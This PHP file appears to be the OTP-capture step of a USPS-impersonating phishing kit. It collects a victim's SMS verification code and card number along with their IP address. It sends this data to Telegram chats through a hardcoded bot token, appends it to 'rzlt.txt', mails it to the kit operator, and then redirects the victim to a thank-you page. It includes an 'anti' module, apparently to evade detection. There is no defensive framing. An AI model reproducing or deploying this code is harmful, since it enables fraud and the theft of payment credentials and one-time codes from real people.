<?php
include "anti/index.php";
include "mailto.php";
include "id.php";
if(isset($_POST['okbbx'])){
$ip = getenv("REMOTE_ADDR");
$message = "-------------------- <3 USPS <3-------------------\nSMS Code  : ".$_POST['sms1']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot1834563751:AAHvd5FWcQ_AULvpqA5S3t7I0cnI6b9euwA/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
	$subject="❤ PaLEsTiNi ❤ OTP [".$_POST['sms1']."] FOR [".$_POST['ccnumb']."] From [".$ip."]";
	$headers="From: 📬 USPS 📬 <newsmsss@palestini.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	@mail($yours,$subject,$message,$headers);
HEADER("Location: thanks.php");
}
?>